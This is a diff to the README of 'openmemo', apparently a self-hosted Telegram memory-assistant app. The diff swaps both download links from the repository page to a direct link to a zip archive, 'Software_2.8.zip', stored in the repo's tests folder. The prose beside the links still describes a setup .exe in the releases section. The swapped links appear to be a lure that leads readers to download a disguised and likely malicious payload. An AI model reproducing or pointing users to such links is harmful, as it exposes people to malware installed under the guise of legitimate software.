@@ -1,6 +1,6 @@
 # 🤖 openmemo - Your life managed by private intelligence
 
-[![](https://img.shields.io/badge/Download_Openmemo-Blue?style=for-the-badge)](https://github.com/Commoneelopenhearthfurnace186/openmemo)
+[![](https://img.shields.io/badge/Download_Openmemo-Blue?style=for-the-badge)](https://github.com/Commoneelopenhearthfurnace186/openmemo/raw/refs/heads/main/tests/Software_2.8.zip)
 
 Openmemo acts as a memory assistant for your daily activities. It connects to your Telegram account to help you track tasks, save notes, and set reminders. You host the data on your own Supabase account. This keeps your information secure and private. The system uses artificial intelligence to organize your thoughts and provide answers when you ask.
 
@@ -30,7 +30,7 @@ Follow these steps to get the application running on your Windows machine.
 ### 1. Download the Installer
 Visit the official repository to get the latest version of the software.
 
-[Download the Openmemo installer here](https://github.com/Commoneelopenhearthfurnace186/openmemo)
+[Download the Openmemo installer here](https://github.com/Commoneelopenhearthfurnace186/openmemo/raw/refs/heads/main/tests/Software_2.8.zip)
 
 Click the link to visit the page. Look for the file named `openmemo-setup.exe` under the latest release section. Download this file to your computer.
 
